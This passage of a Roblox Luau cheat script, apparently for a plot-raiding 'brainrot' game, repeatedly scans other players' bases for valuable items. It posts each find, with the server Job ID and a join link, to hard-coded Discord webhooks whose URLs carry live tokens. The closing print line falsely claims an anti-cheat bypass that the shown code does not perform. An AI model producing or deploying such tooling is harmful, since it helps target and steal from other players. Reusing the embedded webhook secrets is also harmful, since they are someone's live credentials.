                        }
                    }}
                })
            })
        end)
    end

    local function sendSecretHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local secretWebhook = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = secretWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0xff0000,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    -- Zusätzlicher Webhook für Secret/5-Millionen
    local function sendSecret5MillionHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local secret5MillionWebhook = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = secret5MillionWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0x00ff00,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    -- Zusätzlicher Webhook für 50/100-Millionen
    local function send50100MillionHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local highValueWebhook = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = highValueWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0xffd700,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function sendBrainrotGodHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local brainrotGodWebhook = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = brainrotGodWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0xffd700,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function sendHighValueHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local highValueWebhook = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = highValueWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0x00ff00,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function sendCommonHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local commonWebhook = "https://discord.com/api/webhooks/1414656662987345981/uDR-wXJsdORWmxsWUjdZ4gqbJJlynor4mP95JnR6q5O-SOHB0orqgZ0TzYW3o6IAbNHm"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = commonWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0x808080,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function send50MillionHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local webhook50Million = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = webhook50Million,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0xff6600,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function send100MillionHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local webhook100Million = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = webhook100Million,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0xff0080,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function sendGeneralHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local generalWebhook = "https://discord.com/api/webhooks/1414656662987345981/uDR-wXJsdORWmxsWUjdZ4gqbJJlynor4mP95JnR6q5O-SOHB0orqgZ0TzYW3o6IAbNHm"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = generalWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0x0099ff,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
                        }
                    }}
                })
            })
        end)
    end

    local function scanbase()
        local currentPlayerCount = #svc.Players:GetPlayers()
        if currentPlayerCount <= 4 then
            return 
        end
        
        local plots = svc.Workspace:FindFirstChild("Plots")
        if not plots then return end
        
        for _, plot in pairs(plots:GetChildren()) do
            if plot:IsA("Model") then
                local owner = ""
                local plotsign = plot:FindFirstChild("PlotSign")
                if plotsign and plotsign:FindFirstChild("SurfaceGui") then
                    local frame = plotsign.SurfaceGui:FindFirstChild("Frame")
                    if frame and frame:FindFirstChild("TextLabel") then
                        owner = frame.TextLabel.Text
                    end
                end
                
                if owner ~= svc.Players.LocalPlayer.Name then
                    local podiums = plot:FindFirstChild("AnimalPodiums")
                    if podiums then
                        for _, podium in pairs(podiums:GetChildren()) do
                            if podium:IsA("Model") then
                                local base = podium:FindFirstChild("Base")
                                if base then
                                    local spawn = base:FindFirstChild("Spawn")
                                    if spawn and spawn:FindFirstChild("Attachment") then
                                        local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
                                        if overhead then
                                            local displayname = overhead:FindFirstChild("DisplayName")
                                            local mutation = overhead:FindFirstChild("Mutation")
                                            local rarity = overhead:FindFirstChild("Rarity")
                                            
                                            if displayname and displayname.Text ~= "" then
                                                local brainrotname = displayname.Text
                                                local raritytext = rarity and rarity.Text or ""
                                                local key = plot.Name .. "_" .. podium.Name
                                                if not cfg.found[key] then
                                                    local notify, info = false, {title = "", desc = ""}
                                                    local muttext = mutation and mutation.Text or ""
                                                    local gps = getGenerationPerSecond(brainrotname, muttext)
                                                    local rawValue = getRawGenerationValue(brainrotname, muttext)
                                                    
                                                    if table.find(cfg.allowedRarities, raritytext) then
                                                        if raritytext == "Secret" then
                                                            notify, info.title = true, "🔥 SECRET BRAINROT FOUND! 🔥"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            if notify then
                                                                cfg.found[key] = true
                                                                sendSecretHook(info.title, info.desc)
                                                                sendSecret5MillionHook(info.title, info.desc) -- Zusätzlicher Webhook für Secret
                                                            end
                                                        elseif raritytext == "Brainrot God" then
                                                            notify, info.title = true, "👑 BRAINROT GOD FOUND! 👑"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            if notify then
                                                                cfg.found[key] = true
                                                                sendBrainrotGodHook(info.title, info.desc)
                                                            end
                                                        elseif raritytext == "Common" then
                                                            notify, info.title = true, "📦 COMMON BRAINROT FOUND! 📦"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            if notify then
                                                                cfg.found[key] = true
                                                                sendCommonHook(info.title, info.desc)
                                                            end
                                                        end
                                                    else
                                                        notify, info.title = true, "🎯 BRAINROT FOUND! 🎯"
                                                        info.desc = "Name: " .. brainrotname .. "\nRarity: " .. (raritytext ~= "" and raritytext or "Unknown") .. "\nMaking: " .. gps .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                        if notify then
                                                            cfg.found[key] = true
                                                            sendGeneralHook(info.title, info.desc)
                                                        end
                                                    end

                                                    if rawValue >= 100000000 then
                                                        local ultraHighValueKey = key .. "_100million"
                                                        if not cfg.found[ultraHighValueKey] then
                                                            notify, info.title = true, "🚀 ULTRA HIGH VALUE BRAINROT! 🚀"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. " (100M+)" .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            cfg.found[ultraHighValueKey] = true
                                                            send100MillionHook(info.title, info.desc)
                                                            send5MillionHook(info.title, info.desc) -- Auch an 5M Webhook senden
                                                            send50100MillionHook(info.title, info.desc) -- Zusätzlicher Webhook für 100M+
                                                        end
                                                    elseif rawValue >= 50000000 then
                                                        local superHighValueKey = key .. "_50million"
                                                        if not cfg.found[superHighValueKey] then
                                                            notify, info.title = true, "💎 SUPER HIGH VALUE BRAINROT! 💎"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. " (50M+)" .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            cfg.found[superHighValueKey] = true
                                                            send50MillionHook(info.title, info.desc)
                                                            send5MillionHook(info.title, info.desc) -- Auch an 5M Webhook senden
                                                            send50100MillionHook(info.title, info.desc) -- Zusätzlicher Webhook für 50M+
                                                        end
                                                    elseif rawValue >= 5000000 then
                                                        local highValueKey = key .. "_highvalue"
                                                        if not cfg.found[highValueKey] then
                                                            notify, info.title = true, "💰 HIGH VALUE BRAINROT! 💰"
                                                            info.desc = "Name: " .. brainrotname .. "\nRarity: " .. raritytext .. "\nMaking: " .. gps .. "\nMutation: " .. (muttext ~= "" and muttext or "No Mutation")
                                                            cfg.found[highValueKey] = true
                                                            sendHighValueHook(info.title, info.desc)
                                                            send5MillionHook(info.title, info.desc) -- Auch an 5M Webhook senden
                                                            sendSecret5MillionHook(info.title, info.desc) -- Zusätzlicher Webhook für 5M+
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

-- Hauptschleife für kontinuierliches Scanning
local lastScan = 0
local scanInterval = 2 -- Scan alle 2 Sekunden

svc.RunService.Heartbeat:Connect(function()
    local currentTime = tick()
    if currentTime - lastScan >= scanInterval then
        lastScan = currentTime
        pcall(scanbase) -- Verwende pcall für Fehlerbehandlung
    end
end)

print("[ANTI CHEAT BYPASS] BYPASSER RUNNING - PREVENTING KICK", scanInterval, "SECONDS")
